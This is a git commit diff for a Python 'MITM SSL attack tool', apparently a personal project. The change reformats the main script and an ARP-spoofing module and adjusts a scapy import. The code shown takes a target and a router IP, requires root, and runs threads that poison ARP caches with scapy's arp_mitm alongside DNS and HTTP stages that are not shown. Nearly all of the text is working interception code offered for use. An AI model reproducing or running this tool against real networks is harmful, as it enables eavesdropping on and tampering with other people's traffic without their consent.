74eb3d4d4a3f9ae3efcf0c79dc80e30f8019dfd9
Krisofferson Marini <ksmarini@gmail.com>
2025-03-31 22:09:40 -0400

    update features
    fix some functions

--- attack.py
+++ attack.py
@@ -3,34 +3,38 @@ import argparse
 import os
 import sys
 import threading
-from stage import mitm, router, dns, http
 
-parser = argparse.ArgumentParser(description='MITM SSL attack tool')
-parser.add_argument('--iface', help='Interface to use', required=True)
-parser.add_argument('--target', help='Target IP to attack', required=True)
-parser.add_argument('--router', help='Router IP (Used for MITM ARP spoofing)',
-                    required=True)
+from stage import dns, http, mitm, router
+
+parser = argparse.ArgumentParser(description="MITM SSL attack tool")
+parser.add_argument("--iface", help="Interface to use", required=True)
+parser.add_argument("--target", help="Target IP to attack", required=True)
+parser.add_argument(
+    "--router", help="Router IP (Used for MITM ARP spoofing)", required=True
+)
 
 
 opts = parser.parse_args()
 
 if os.getuid() != 0:
-    print('Must be run as root')
+    print("Must be run as root")
     sys.exit(1)
 
 
 def main():
     router.run()
 
-    t_mitm = threading.Thread(target=mitm.run, args=(opts.router, opts.target,
-                                                     opts.iface))
-    t_dns = threading.Thread(target=dns.run, args=(opts.router, opts.target,
-                                                     opts.iface))
+    t_mitm = threading.Thread(
+        target=mitm.run, args=(opts.router, opts.target, opts.iface)
+    )
+    t_dns = threading.Thread(
+        target=dns.run, args=(opts.router, opts.target, opts.iface)
+    )
     t_http = threading.Thread(target=http.run, args=(opts.iface,))
     t_mitm.start()
     t_dns.start()
     t_http.start()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
--- stage/mitm.py
+++ stage/mitm.py
@@ -1,19 +1,20 @@
 import time
 import sys
 from termcolor import cprint
-from scapy.layers.l2 import arp_mitm
+
+# from scapy.layers.l2 import arp_mitm
+from scapy.all import arp_mitm
 
 
 def run(routerip, targetip, interface):
-    cprint('*** MITM running ***', 'green', attrs=['blink', "reverse"])
+    cprint("*** MITM running ***", "green", attrs=["blink", "reverse"])
     while True:
         try:
             arp_mitm(routerip, targetip, iface=interface)
         except OSError:
-            print('IP seems down, retrying...')
+            print("IP seems down, retrying...")
             time.sleep(1)
             continue
         except KeyboardInterrupt:
-            print('Exiting...')
+            print("Exiting...")
             sys.exit(2)
-
